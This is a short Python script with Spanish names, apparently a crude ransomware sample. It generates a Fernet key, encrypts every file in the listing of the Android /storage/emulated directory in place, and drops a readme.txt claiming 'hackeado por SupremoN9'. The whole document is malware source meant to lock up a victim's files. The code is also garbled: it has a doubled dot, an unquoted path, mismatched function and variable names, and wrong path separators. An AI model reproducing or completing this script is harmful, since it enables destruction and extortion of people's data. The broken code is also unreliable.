from cryptography.fernet import Fernet 
import os 


def generatekey():
    key = Fernet..generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def retornarkey():
    return open("key.key", "rb").read()


def encryp(items, key):
    i = Fernet(key)
    for x in items:
        with open(x, "rb") as file:
             file_data = file.read()
        data = i.encrypt(file_data)

        with open(x, "wb") as file: 
            file.write(data)


if __name__  == "__main__": 


    archivos = /storage/emulated
    items = os.listdir(archivos)
    archivos2 =  [archivos+"\\"+x for x in items]



generarKey()
key = retornarkey()

encryp(archivos_2, key)

with open(archivos+"\\"+"readme.txt", "wb") as file: 
     file.write ("SupremoN9")
     file.write("hackeado por SupremoN9")

